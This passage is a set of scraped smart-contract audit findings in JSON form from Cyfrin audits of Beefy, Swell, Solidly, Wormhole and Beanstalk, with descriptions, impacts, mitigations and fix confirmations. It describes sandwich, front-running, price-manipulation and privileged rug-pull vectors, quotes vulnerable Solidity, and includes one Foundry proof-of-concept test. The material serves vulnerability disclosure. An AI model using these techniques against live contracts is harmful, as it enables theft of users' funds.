        " Due to the lack of slippage parameter an MEV attacker could sandwich attack the swap to return fewer output tokens to the protocol than would otherwise be returned. For StrategyPassiveManagerUniswap the reduced output tokens applies to the protocol's fees.",
        "Whether the attack will be profitable or not will depend on the gas cost the attacker has to pay; it may well be that on L2s and Alt-L1s where Beefy intends to deploy, it will be profitable to exploit these swaps with the small pool manipulation onlyCalmPeriods may allow because the gas costs are so low.",
        "Combined with a lack of effective deadline timestamp, malicious validators could also hold the swap transaction and execute it at a later time when it would return a reduced token amount than if it had been executed immediately. The onlyCalmPeriods check wouldn't appear to provide any protection against this since the swap would still be executed in a calm period, just at a later time when it would return less tokens than the caller expected when they called it.",
        "The previous state could also arise organically due to a sudden and sustained spike in gas costs for example from a popular and prolonged NFT mint; the transaction could be organically delayed and executed at a later time resulting in a worse swap than would have occurred had it been executed when it was supposed to."
    ],
    "Recommended Mitigation": [
        " A valid slippage parameter ideally calculated off-chain should be passed to the swap."
    ],
    "Beefy": [
        "\nAcknowledged - known issue. Problem lies in the price being manipulated and then harvest being called would still result in a bad trade even with slippage protections. We harvest frequently to make sure the viability of this attack is mitigated. Also this is only resulting in less fees for the protocol, not the users.",
        "\\clearpage"
    ]
}
----End JSON----

https://solodit.xyz/issues/blocktimestamp-used-as-swap-deadline-offers-no-protection-cyfrin-none-cyfrin-beefy-finance-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [],
    "Description": [
        " UniV3Utils::swap performs a swap with deadline: block.timestamp. This function is called by StrategyPassiveManagerUniswap::_chargeFees L375, L389 and BeefyQIVault::_swapRewardsToNative L223."
    ],
    "Impact": [
        " The block the transaction is eventually put into will be block.timestamp so this offers no protection."
    ],
    "Recommended Mitigation": [
        " Caller should pass in a desired deadline which should be passed to the swap as the deadline parameter."
    ],
    "Beefy": [
        "\nAcknowledged - known issue."
    ]
}
----End JSON----

https://solodit.xyz/issues/native-tokens-permanently-stuck-in-strategypassivemanageruniswap-contract-due-to-rounding-in-_chargefees-cyfrin-none-cyfrin-beefy-finance-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "pragma solidity 0.8.23;\n\nimport {Test, console} from \"forge-std/Test.sol\";\nimport {IERC20} from \"@openzeppelin-4/contracts/token/ERC20/ERC20.sol\";\nimport {BeefyVaultConcLiq} from \"contracts/protocol/concliq/vault/BeefyVaultConcLiq.sol\";\nimport {BeefyVaultConcLiqFactory} from \"contracts/protocol/concliq/vault/BeefyVaultConcLiqFactory.sol\";\nimport {StrategyPassiveManagerUniswap} from \"contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol\";\nimport {StrategyFactory} from \"contracts/protocol/concliq/uniswap/StrategyFactory.sol\";\nimport {StratFeeManagerInitializable} from \"contracts/protocol/beefy/StratFeeManagerInitializable.sol\";\nimport {IStrategyConcLiq} from \"contracts/interfaces/beefy/IStrategyConcLiq.sol\";\nimport {UniV3Utils} from \"contracts/interfaces/exchanges/UniV3Utils.sol\";\n\n// Test WBTC/USDC Uniswap Strategy\ncontract ConLiqWBTCUSDCTest is Test {\n    BeefyVaultConcLiq vault;\n    BeefyVaultConcLiqFactory vaultFactory;\n    StrategyPassiveManagerUniswap strategy;\n    StrategyPassiveManagerUniswap implementation;\n    StrategyFactory factory;\n    address constant pool = 0x9a772018FbD77fcD2d25657e5C547BAfF3Fd7D16;\n    address constant token0 = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;\n    address constant token1 = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;\n    address constant native = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n    address constant strategist = 0xb2e4A61D99cA58fB8aaC58Bb2F8A59d63f552fC0;\n    address constant beefyFeeRecipient = 0x65f2145693bE3E75B8cfB2E318A3a74D057e6c7B;\n    address constant beefyFeeConfig = 0x3d38BA27974410679afF73abD096D7Ba58870EAd;\n    address constant unirouter = 0xE592427A0AEce92De3Edee1F18E0157C05861564;\n    address constant keeper = 0x4fED5491693007f0CD49f4614FFC38Ab6A04B619;\n    int24 constant width = 500;\n    address constant user = 0x161D61e30284A33Ab1ed227beDcac6014877B3DE;\n    bytes tradePath1;\n    bytes tradePath2;\n    bytes path0;\n    bytes path1;\n\n    function setUp() public {\n        BeefyVaultConcLiq vaultImplementation = new BeefyVaultConcLiq();\n        vaultFactory = new BeefyVaultConcLiqFactory(address(vaultImplementation));\n        vault = vaultFactory.cloneVault();\n        implementation = new StrategyPassiveManagerUniswap();\n        factory = new StrategyFactory(keeper);\n\n        address[] memory lpToken0ToNative = new address[](2);\n        lpToken0ToNative[0] = token0;\n        lpToken0ToNative[1] = native;\n\n        address[] memory lpToken1ToNative = new address[](2);\n        lpToken1ToNative[0] = token1;\n        lpToken1ToNative[1] = native;\n\n        uint24[] memory fees = new uint24[](1);\n        fees[0] = 500;\n\n        path0 = routeToPath(lpToken0ToNative, fees);\n        path1 = routeToPath(lpToken1ToNative, fees);\n\n        address[] memory tradeRoute1 = new address[](2);\n        tradeRoute1[0] = token0;\n        tradeRoute1[1] = token1;\n\n        address[] memory tradeRoute2 = new address[](2);\n        tradeRoute2[0] = token1;\n        tradeRoute2[1] = token0;\n\n        tradePath1 = routeToPath(tradeRoute1, fees);\n        tradePath2 = routeToPath(tradeRoute2, fees);\n\n        StratFeeManagerInitializable.CommonAddresses memory commonAddresses = StratFeeManagerInitializable.CommonAddresses(\n            address(vault),\n            unirouter,\n            keeper,\n            strategist,\n            beefyFeeRecipient,\n            beefyFeeConfig\n        );\n\n        factory.addStrategy(\"StrategyPassiveManagerUniswap_v1\", address(implementation));\n\n        address _strategy = factory.createStrategy(\"StrategyPassiveManagerUniswap_v1\");\n        strategy = StrategyPassiveManagerUniswap(_strategy);\n        strategy.initialize(\n            pool,\n            native,\n            width,\n            path0,\n            path1,\n            commonAddresses\n        );\n\n        // render calm check ineffective to allow deposit to work; not related to the\n        // identified bug, for some reason (possibly block forking) the first deposit\n        // was failing due to the calm check\n        strategy.setTwapInterval(1);\n\n        vault.initialize(address(strategy), \"Moo Vault\", \"mooVault\");\n    }\n\n    function test_StrategyAccumulatesNativeFeeTokensDueToRounding() public {\n        // strategy has no native tokens\n        assertEq(IERC20(native).balanceOf(address(strategy)), 0);\n\n        // fuzzer has no native tokens\n        assertEq(IERC20(native).balanceOf(address(this)), 0);\n\n        // user deposits a large amount; Beefy will use this\n        // to establish an LP position to start earning fees\n        deposit(100e8, 6000000e6);\n\n        // user performs a couple of trades between BTC/USDC\n        // this will generate LP fees\n        trade(true, 3e8);\n        trade(false, 123457e6);\n\n        // trigger a Beefy harvest; this will collect the LP\n        // fees, convert them into native tokens then distribute\n        // all the converted native tokens between:\n        // * this contract as the caller of the harvest\n        // * beefy\n        // * the strategist registered with the strategy\n        skip(10 hours);\n        strategy.harvest(address(this));\n\n        // verify that this contract has received some LP fees\n        // converted into native tokens\n        assert(IERC20(native).balanceOf(address(this)) > 0);\n\n        // none of the native tokens that were converted from the\n        // collected fees should remain in strategy contract\n        // this fails due to rounding during division in\n        // `StrategyPassiveManagerUniswap::_chargeFees` which will\n        // result in native tokens converted from fees accumulating\n        // and being permanently stuck in the strategy contract\n        assertEq(IERC20(native).balanceOf(address(strategy)), 0);\n    }\n\n    function deposit(uint256 token0Amount, uint256 token1Amount) public {\n        vm.startPrank(user);\n\n        deal(address(token0), user, token0Amount);\n        deal(address(token1), user, token1Amount);\n\n        IERC20(token0).approve(address(vault), token0Amount);\n        IERC20(token1).approve(address(vault), token1Amount);\n\n        uint _shares = vault.previewDeposit(token0Amount, token1Amount);\n\n        vault.depositAll(_shares);\n\n        vm.stopPrank();\n    }\n\n    function trade(bool tokenInd, uint256 tokenAmount) public {\n        vm.startPrank(user);\n\n        if(tokenInd) {\n            deal(address(token0), user, tokenAmount);\n\n            IERC20(token0).approve(address(unirouter), tokenAmount);\n            UniV3Utils.swap(unirouter, tradePath1, tokenAmount);\n        }\n        else {\n            deal(address(token1), user, tokenAmount);\n\n            IERC20(token1).approve(address(unirouter), tokenAmount);\n            UniV3Utils.swap(unirouter, tradePath2, tokenAmount);\n        }\n\n        vm.stopPrank();\n    }\n\n    // Convert token route to encoded path\n    // uint24 type for fees so path is packed tightly\n    function routeToPath(\n        address[] memory _route,\n        uint24[] memory _fee\n    ) internal pure returns (bytes memory path) {\n        path = abi.encodePacked(_route[0]);\n        uint256 feeLength = _fee.length;\n        for (uint256 i = 0; i < feeLength; i++) {\n            path = abi.encodePacked(path, _fee[i], _route[i+1]);\n        }\n    }\n}\n"
    ],
    "Description": [
        " StrategyPassiveManagerUniswap::_chargeFees converts LP fees into the native token then distributes the native tokens split between:",
        "However due to rounding during division some tokens are not distributed but instead accumulate inside the StrategyPassiveManagerUniswap contract where they are permanently stuck."
    ],
    "Impact": [
        " Fees will accumulate inside the StrategyPassiveManagerUniswap contract where they are permanently stuck. Although the amount each time is small the effect is cumulative, especially given that this protocol is intended to be deployed on the many blockchains where Beefy currently operates."
    ],
    "Proof of Concept": [
        " Add a new test file test/forge/ConcLiqTests/ConcLiqWBTCUSDC.t.sol:",
        "Run with: forge test --match-path test/forge/ConcLiqTests/ConcLiqWBTCUSDC.t.sol --fork-url https://rpc.ankr.com/eth -vv"
    ],
    "Recommended Mitigation": [
        " Refactor StrategyPassiveManagerUniswap::_chargeFees to distribute whatever remains to the Beefy protocol:"
    ],
    "Beefy": [
        "\nFixed in commit 86c7de5."
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/strategypassivemanageruniswap-gives-erc20-token-allowances-to-unirouter-but-doesnt-remove-allowances-when-unirouter-is-updated-cyfrin-none-cyfrin-beefy-finance-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "function _giveAllowances() private {\n    IERC20Metadata(lpToken0).forceApprove(unirouter, type(uint256).max);\n    IERC20Metadata(lpToken1).forceApprove(unirouter, type(uint256).max);\n}\n",
        " function setUnirouter(address _unirouter) external onlyOwner {\n    unirouter = _unirouter;\n    emit SetUnirouter(_unirouter);\n}\n"
    ],
    "Description": [
        " StrategyPassiveManagerUniswap gives ERC20 token allowances to unirouter:",
        "unirouter is inherited from StratFeeManagerInitializable which has an external function setUnirouter which allows unirouter to be changed:",
        "The allowances can only be removed by calling StrategyPassiveManagerUniswap::panic however unirouter can be changed any time via the setUnirouter function.",
        "This allows the contract to enter a state where unirouter is updated via setUnirouter but the ERC20 token approvals given to the old unirouter are not removed."
    ],
    "Impact": [
        " The old unirouter contract will continue to have ERC20 token approvals for StratFeeManagerInitializable so it can continue to spend the protocol's tokens when this is not the protocol's intention as the protocol has changed unirouter."
    ],
    "Recommended Mitigation": [
        " 1) Make StratFeeManagerInitializable::setUnirouter virtual such that it can be overridden by child contracts.\n2) StrategyPassiveManagerUniswap should override setUnirouter to remove all allowances before calling the parent function to update unirouter."
    ],
    "Beefy": [
        "\nFixed in commit 8fd397f."
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/update-to-stratfeemanagerinitializablebeefyfeeconfig-retrospectively-applies-new-fees-to-pending-lp-rewards-yet-to-be-claimed-cyfrin-none-cyfrin-beefy-finance-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [],
    "Description": [
        " The fee configuration StratFeeManagerInitializable::beefyFeeConfig can be updated via StratFeeManagerInitializable::setBeefyFeeConfig L164-167 while LP rewards are collected and fees charged via StrategyPassiveManagerUniswap::_harvest L306-311.",
        "This allows the protocol to enter a state where the fee configuration is updated to for example increase Beefy's protocol fees, then the next time harvest is called the higher fees are retrospectively applied to the LP rewards that were pending under the previously lower fee regime."
    ],
    "Impact": [
        " The protocol owner can retrospectively alter the fee structure to steal pending LP rewards instead of distributing them to protocol users; the retrospective application of fees is unfair on protocol users because those users deposited their liquidity into the protocol and generated LP rewards at the previous fee levels."
    ],
    "Recommended Mitigation": [
        " 1) StratFeeManagerInitializable::setBeefyFeeConfig should be declared virtual\n2) StrategyPassiveManagerUniswap should override it and before calling the parent function, first call _claimEarnings then _chargeFees",
        "This ensures that pending LP rewards are collected and have the correct fees charged on them, and only after that has happened is the new fee structure updated."
    ],
    "Beefy": [
        "\nAcknowledged.",
        "\\clearpage"
    ]
}
----End JSON----

https://solodit.xyz/issues/swelllibbot-can-delete-active-validators-when-bot-methods-are-paused-cyfrin-none-cyfrin-swell-barracuda-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "if (AccessControlManager.botMethodsPaused()) {\n  revert SwellLib.BotMethodsPaused();\n}\n",
        "bool isBot = AccessControlManager.hasRole(SwellLib.BOT, msg.sender);\n\n// prevent bot from calling this function when bot methods are paused\nif(isBot && AccessControlManager.botMethodsPaused()) {\n  revert SwellLib.BotMethodsPaused();\n}\n\n// function only callable by admin & bot\nif (!AccessControlManager.hasRole(SwellLib.PLATFORM_ADMIN, msg.sender) && !isBot) {\n  revert OnlyPlatformAdminOrBotCanDeleteActiveValidators();\n}\n"
    ],
    "Description": [
        " Almost all of the functions callable by SwellLib.BOT contain the following check to prevent bot functions from working when bot methods are paused:",
        "The one exception is NodeOperatorRegistry::deleteActiveValidators which is callable by SwellLib.BOT even when bot methods are paused. Consider:",
        "One possible implementation for the first solution:"
    ],
    "Swell": [
        " Fixed in commit 1a105b7."
    ],
    "Cyfrin": [
        "\nVerified."
    ]
}
----End JSON----

https://solodit.xyz/issues/swelllibbot-can-subtly-rug-pull-withdrawals-by-setting-_processedrate-0-when-calling-swexitprocesswithdrawals-cyfrin-none-cyfrin-swell-barracuda-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "uint256 rateWhenCreated = AccessControlManager.swETH().swETHToETHRate();\n",
        "function processWithdrawals(\n  uint256 _lastTokenIdToProcess,\n  uint256 _processedRate\n) external override checkRole(SwellLib.BOT) {\n",
        "uint256 finalRate = _processedRate > rateWhenCreated\n  ? rateWhenCreated\n  : _processedRate;\n",
        "uint256 requestExitedETH = wrap(amount).mul(wrap(finalRate)).unwrap();\n"
    ],
    "Description": [
        " When users create a withdrawal request, their swETH is burned then the current exchange rate rateWhenCreated is fetched from swETH::swETHToETHRate:",
        "However SwellLib.BOT can pass an arbitrary value for _processedRate when calling swEXIT::processWithdrawals:",
        "The final rate used is the lesser of rateWhenCreated and _processedRate:",
        "This final rate is multiplied by the requested withdrawal amount to determine the actual amount sent to the user requesting a withdrawal:",
        "Hence SwellLib.BOT can subtly rug-pull all withdrawals by setting _processedRate = 0 when calling swEXIT::processWithdrawals."
    ],
    "Recommended Mitigation": [
        " Two possible mitigations:"
    ],
    "Swell": [
        " Fixed in commits c6f8708, 64cfbdb."
    ],
    "Cyfrin": [
        "\nVerified.",
        "\\clearpage"
    ]
}
----End JSON----

https://solodit.xyz/issues/attacker-can-abuse-rewardsdistributortriggerroot-to-block-reward-claims-and-unpause-a-paused-state-cyfrin-none-cyfrin-solidlyv3-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "    function triggerRoot() external {\n        bytes32 rootCandidateAValue = rootCandidateA.value;\n        if (rootCandidateAValue != rootCandidateB.value || rootCandidateAValue == bytes32(0)) revert RootCandidatesInvalid();\n        root = Root({value: rootCandidateAValue, lastUpdatedAt: block.timestamp});\n        emit RootChanged(msg.sender, rootCandidateAValue);\n    }\n"
    ],
    "Description": [
        " Consider the code of RewardsDistributor::triggerRoot:",
        "This function:"
    ],
    "Impact": [
        " An attacker can abuse this function in 2 ways:"
    ],
    "Recommended Mitigation": [
        " Two possible options:"
    ],
    "Solidly": [
        "\nFixed in commits 653c196 & 1170eac."
    ],
    "Cyfrin": [
        "\nVerified. One consequence of the updated implementation is that the contract will start in the \"paused\" state and root candidates will be unable to be set. This means that the admin will have to set the first valid root via setRoot in order to \"unpause\" from the initial state post-deployment."
    ]
}
----End JSON----

https://solodit.xyz/issues/rewardsdistributor-doesnt-correctly-handle-deposits-of-fee-on-transfer-incentive-tokens-cyfrin-none-cyfrin-solidlyv3-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "function _depositLPIncentive(\n    StoredReward memory reward,\n    uint256 amount,\n    uint256 periodReceived\n) private {\n    IERC20(reward.token).safeTransferFrom(\n        msg.sender,\n        address(this),\n        amount\n    );\n\n    // @audit stored `amount` here will be incorrect since it doesn't account for\n    // the actual amount received after the transfer fee was deducted in-transit\n    _storeReward(periodReceived, reward, amount);\n}\n"
    ],
    "Description": [
        " the kenneth stated in telegram that Fee-On-Transfer tokens are fine to use as incentive tokens with RewardsDistributor, however when receiving Fee-On-Transfer tokens and storing the reward amount the accounting does not account for the fee deducted from the transfer amount in-transit, for example:"
    ],
    "Impact": [
        " The actual reward calculation is done off-chain and is outside the audit scope nor do we have visibility of that code. But events emitted by RewardsDistributor and the stored incentive token deposits in RewardsDistributor::periodRewards use incorrect amounts for Fee-On-Transfer incentive token deposits."
    ],
    "Recommended Mitigation": [
        " In RewardsDistributor::_depositLPIncentive & depositVoteIncentive:",
        "Also note that RewardsDistributor::periodRewards is never read in the contract, only written to. If it is not used by off-chain processing then consider removing it."
    ],
    "Solidly": [
        "\nFixed in commit be54da1."
    ],
    "Cyfrin": [
        "\nVerified."
    ]
}
----End JSON----

https://solodit.xyz/issues/attacker-can-corrupt-rewardsdistributor-internal-accounting-forcing-lp-token-incentive-deposits-to-revert-for-tokens-like-cusdcv3-cyfrin-none-cyfrin-solidlyv3-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "function _validateIncentive(\n    address token,\n    uint256 amount,\n    uint256 distributionStart,\n    uint256 numDistributionPeriods\n) private view {\n    // distribution must start on future epoch flip and last for [1, max] periods\n    if (\n        numDistributionPeriods == 0                  || // Distribution in 0 periods is invalid\n        numDistributionPeriods > maxIncentivePeriods || // Distribution over max period is invalid\n        distributionStart % EPOCH_DURATION != 0      || // Distribution must start at the beginning of a week\n        distributionStart < block.timestamp             // Distribution must start in the future\n    ) revert InvalidIncentiveDistributionPeriod();\n\n    // approvedIncentiveAmounts indicates the min amount of\n    // tokens to distribute per period for a whitelisted token\n    uint256 minAmount = approvedIncentiveAmounts[token] * numDistributionPeriods;\n\n    // @audit validation passes for `amount == type(uint256).max`\n    if (minAmount == 0 || amount < minAmount)\n        revert InvalidIncentiveAmount();\n}\n\nfunction _depositLPIncentive(\n    StoredReward memory reward,\n    uint256 amount,\n    uint256 periodReceived\n) private {\n    // @audit does not guarantee that `amount`\n    // is transferred if `amount == type(uint256).max`\n    IERC20(reward.token).safeTransferFrom(msg.sender, address(this), amount);\n\n    // @audit incorrect `amount` will be stored in this case\n    _storeReward(periodReceived, reward, amount);\n}\n",
        "function _validateDistributionPeriod(\n    uint256 distributionStart,\n    uint256 numDistributionPeriods\n) private view {\n    // distribution must start on future epoch flip and last for [1, max] periods\n    if (\n        numDistributionPeriods == 0                  || // Distribution in 0 periods is invalid\n        numDistributionPeriods > maxIncentivePeriods || // Distribution over max period is invalid\n        distributionStart % EPOCH_DURATION != 0      || // Distribution must start at the beginning of a week\n        distributionStart < block.timestamp             // Distribution must start in the future\n    ) revert InvalidIncentiveDistributionPeriod();\n}\n\n// Before calling this function, _validateDistributionPeriod must be called\nfunction _validateIncentive(\n    address token,\n    uint256 amount,\n    uint256 numDistributionPeriods\n) private view {\n    uint256 minAmount = approvedIncentiveAmounts[token] * numDistributionPeriods;\n\n    if (minAmount == 0 || amount < minAmount)\n        revert InvalidIncentiveAmount();\n}\n",
        "function _depositLPIncentive(\n    StoredReward memory reward,\n+   uint256 numDistributionPeriods\n    uint256 amount,\n    uint256 periodReceived\n-) private {\n+) private returns(uint256 actualDeposited) {\n+   uint256 tokenBalanceBeforeTransfer = IERC20(reward.token).balanceOf(address(this));\n    IERC20(reward.token).safeTransferFrom(\n        msg.sender,\n        address(this),\n        amount\n    );\n-   _storeReward(periodReceived, reward, amount);\n+   actualDeposited = IERC20(reward.token).balanceOf(address(this)) - tokenBalanceBeforeTransfer;\n+   _validateIncentive(reward.token, actualDeposited, numDistributionPeriods);\n+   _storeReward(periodReceived, reward, actualDeposited);\n}\n",
        "function depositLPTokenIncentive(\n    address pool,\n    address token,\n    uint256 amount,\n    uint256 distributionStart,\n    uint256 numDistributionPeriods\n) external {\n-   _validateIncentive(\n-       token,\n-       amount,\n-       distributionStart,\n-       numDistributionPeriods\n-   );\n+   // Verify that number of period is and start time is valid\n+   _validateDistributionPeriod(\n+       uint256 distributionStart,\n+       uint256 numDistributionPeriods\n+   );\n    StoredReward memory reward = StoredReward({\n        _type: StoredRewardType.LP_TOKEN_INCENTIVE,\n        pool: pool,\n        token: token\n    });\n    uint256 periodReceived = _syncActivePeriod();\n-   _depositLPIncentive(reward, amount, periodReceived);\n+   uint256 actualDeposited = _depositLPIncentive(reward, amount, periodReceived);\n\n    emit LPTokenIncentiveDeposited(\n        msg.sender,\n        pool,\n        token,\n-       amount,\n+       actualDeposited\n        periodReceived,\n        distributionStart,\n        distributionStart + (EPOCH_DURATION * numDistributionPeriods)\n    );\n}\n"
    ],
    "Description": [
        " Some tokens like cUSDCv3 contains a special case for amount == type(uint256).max in their transfer functions that results in only the user's balance being transferred.",
        "For such tokens in this case incentive deposits via depositLPTokenIncentive will transfer less tokens than expected. The consequence of this is if a protocol like Compound wanted to incentivize a pool with a token like cUSDCv3, an attacker can front-run their transaction to corrupt the internal accounting forcing it to revert."
    ],
    "Impact": [
        " Corrupted accounting for incentive reward deposits with tokens like cUSDCv3 can be exploited to deny future incentive reward deposits using the same token."
    ],
    "POC": [
        "\nConsider the following functions:",
        "If a protocol like Compound wanted to incentivize a pool with a token like cUSDCv3 for 2 periods:"
    ],
    "Recommended mitigation": [
        "\nOne possible solution:",
        "This mitigation also resolves the issue related to incorrect accounting for fee-on-transfer tokens."
    ],
    "Solidly": [
        "\nFixed in commit be54da1."
    ],
    "Cyfrin": [
        "\nVerified.",
        "\\clearpage"
    ]
}
----End JSON----

https://solodit.xyz/issues/on-chain-slippage-calculation-using-exchange-rate-derived-from-poolslot0-can-be-easily-manipulated-cyfrin-none-cyfrin-thermae-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [],
    "Description": [
        " On-chain slippage calculation using price from pool.slot0 can be easily manipulated causing users to receive less tokens than they intended."
    ],
    "Impact": [
        " Swaps can result in users receiving less tokens than they intended."
    ],
    "Proof of Concept": [
        " Portico::calcMinAmount attempts to on-chain calculate the minimum amount of tokens a swap should return. It does this using:",
        "The problem is that pool.slot0 is easy to manipulate using flash loans so the actual exchange rate used in the slippage calculation could be far worse than what the user expects; it is very likely users will be continually exploited via sandwich attacks on the swaps."
    ],
    "Recommended Mitigation": [
        ""
    ],
    "Wormhole": [
        "\nFixed in commit af089d6."
    ],
    "Cyfrin": [
        " Verified.",
        "\\clearpage"
    ]
}
----End JSON----

https://solodit.xyz/issues/checking-bool-return-of-erc20-approve-and-transfer-breaks-protocol-for-mainnet-usdt-and-similar-tokens-which-dont-return-true-cyfrin-none-cyfrin-thermae-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [],
    "Description": [
        " Checking bool return of ERC20 approve and transfer breaks protocol for mainnet USDT and similar tokens which don't return true even though the calls were successful."
    ],
    "Impact": [
        " Protocol won't work with mainnet USDT and similar tokens."
    ],
    "Proof of Concept": [
        " Portico.sol L58, 61, 205, 320, 395, 399."
    ],
    "Recommended Mitigation": [
        " Use SafeERC20 or SafeTransferLib."
    ],
    "Wormhole": [
        "\nFixed in commits 3f08be9 & 55f93e2."
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/no-precision-scaling-or-minimum-received-amount-check-when-subtracting-relayerfeeamount-can-revert-due-to-underflow-or-return-less-tokens-to-user-than-specified-cyfrin-none-cyfrin-thermae-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "finalUserAmount = finalToken.balanceOf(address(this)) - relayerFeeAmount;\n"
    ],
    "Description": [
        " PorticoFinish::payOut L376 attempts to subtract the relayerFeeAmount from the final post-bridge and post-swap token balance:",
        "There is no precision scaling to ensure that PorticoFinish's token contract balance and relayerFeeAmount are in the same decimal precision; if the relayerFeeAmount has 18 decimal places but the token is USDC with only 6 decimal places, this can easily revert due to underflow resulting in the bridged tokens being stuck.",
        "An excessively high relayerFeeAmount could also significantly reduce the amount of post-bridge and post-swap tokens received as there is no check on the minimum amount of tokens the user will receive after deducting relayerFeeAmount. This current configuration is an example of the \"MinTokensOut For Intermediate, Not Final Amount\" vulnerability class; as the minimum received tokens check is before the deduction of relayerFeeAmount a user will always receive less tokens than their specified minimum if relayerFeeAmount > 0."
    ],
    "Impact": [
        " Bridged tokens stuck or user receives less tokens than their specified minimum."
    ],
    "Recommended Mitigation": [
        " Ensure that token balance and relayerFeeAmount have the same decimal precision before combining them. Alternatively check for underflow and don't charge a fee if this would be the case. Consider enforcing the user-specified minimum output token check again when deducting relayerFeeAmount, and if this would fail then decrease relayerFeeAmount such that the user at least receives their minimum specified token amount.",
        "Another option is to check that even if it doesn't underflow, that the remaining amount after subtracting relayerFeeAmount is a high percentage of the bridged amount; this would prevent a scenario where relayerFeeAmount takes a large part of the bridged amount, effectively capping relayerFeeAmount to a tiny % of the post-bridge and post-swap funds. This scenario can still result in the user receiving less tokens than their specified minimum however.",
        "From the point of view of the smart contract, it should protect itself against the possibility of the token amount and relayerFeeAmount being in different decimals or that relayerFeeAmount would be too high, similar to how for example L376 inside payOut doesn't trust the bridge reported amount and checks the actual token balance."
    ],
    "Wormhole": [
        "\nFixed in commit 05ba84d by adding an underflow check. Any misbehavior is due to bad user input and should be corrected off-chain. Only the user is able to set the relayer fee in the input parameters."
    ],
    "Cyfrin": [
        " Verified potential underflow due to mismatched precision between relayer fee & token amount is now handled. The implementation now favors the relayer however this is balanced by the fact that only the user can set the relayer fee, so the attack surface is limited to self-inflicted harm. If in the future another entity such as the relayer could set the relayer fee then this could be used to drain the bridged tokens, but with the current implementation this is not possible unless the user sets an incorrectly large relayer fee which is self-inflicted.",
        "\\clearpage"
    ]
}
----End JSON----

https://solodit.xyz/issues/failure-to-add-modified-facets-and-facets-with-modified-dependencies-to-bipsbipseedgauge-breaks-the-protocol-cyfrin-none-cyfrin-beanstalk-bip-39-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "git diff --stat 7606673..dfb418d -- \".sol\" \":\\!protocol/test/\" \":\\!protocol/contracts/mocks/*\" | grep \"Facet.sol\"\n",
        "protocol/contracts/beanstalk/barn/UnripeFacet.sol  | 360 +++++++++------\nprotocol/contracts/beanstalk/field/FieldFacet.sol  |   4 +-\nprotocol/contracts/beanstalk/silo/BDVFacet.sol     |  12 +-\nprotocol/contracts/beanstalk/silo/ConvertFacet.sol |   8 +-\n.../contracts/beanstalk/silo/WhitelistFacet.sol    |  79 +++-\n.../contracts/beanstalk/sun/GaugePointFacet.sol    |  39 ++\n.../beanstalk/sun/SeasonFacet/SeasonFacet.sol      | 120 +++--\n.../sun/SeasonFacet/SeasonGettersFacet.sol         | 248 ++++++++++\n",
        "git diff --stat 7606673..dfb418d -- \"*.sol\" \":\\!protocol/test/*\" \":\\!protocol/contracts/mocks/*\" | grep \"Lib.*\\.sol\"\n",
        ".../contracts/libraries/Convert/LibChopConvert.sol |  60 +++\n.../contracts/libraries/Convert/LibConvert.sol     |  42 +-\n.../contracts/libraries/Convert/LibConvertData.sol |   3 +-\n.../libraries/Convert/LibUnripeConvert.sol         |  18 +-\n.../contracts/libraries/Convert/LibWellConvert.sol |   3 +-\n.../contracts/libraries/Curve/LibBeanMetaCurve.sol |  15 +\n.../contracts/libraries/Curve/LibMetaCurve.sol     |  61 ++-\nprotocol/contracts/libraries/LibCases.sol          | 161 +++++++\nprotocol/contracts/libraries/LibChop.sol           |  65 +++\nprotocol/contracts/libraries/LibEvaluate.sol       | 297 ++++++++++++\nprotocol/contracts/libraries/LibFertilizer.sol     |   2 +\nprotocol/contracts/libraries/LibGauge.sol          | 330 +++++++++++++\nprotocol/contracts/libraries/LibIncentive.sol      |  20 +-\n.../contracts/libraries/LibLockedUnderlying.sol    | 509 +++++++++++++++++++++\nprotocol/contracts/libraries/LibUnripe.sol         | 180 ++++++--\n.../libraries/Minting/LibCurveMinting.sol          |  26 +-\n.../contracts/libraries/Minting/LibWellMinting.sol |  30 +-\n.../libraries/Oracle/LibBeanEthWellOracle.sol      |  55 ---\n.../contracts/libraries/Oracle/LibEthUsdOracle.sol |   3 +-\n.../contracts/libraries/Oracle/LibUsdOracle.sol    |  18 +-\n.../libraries/Silo/LibLegacyTokenSilo.sol          |   4 -\nprotocol/contracts/libraries/Silo/LibTokenSilo.sol |  18 +-\nprotocol/contracts/libraries/Silo/LibWhitelist.sol | 181 ++++++--\n.../libraries/Silo/LibWhitelistedTokens.sol        |  47 ++\nprotocol/contracts/libraries/Well/LibWell.sol      | 217 ++++++++-\n",
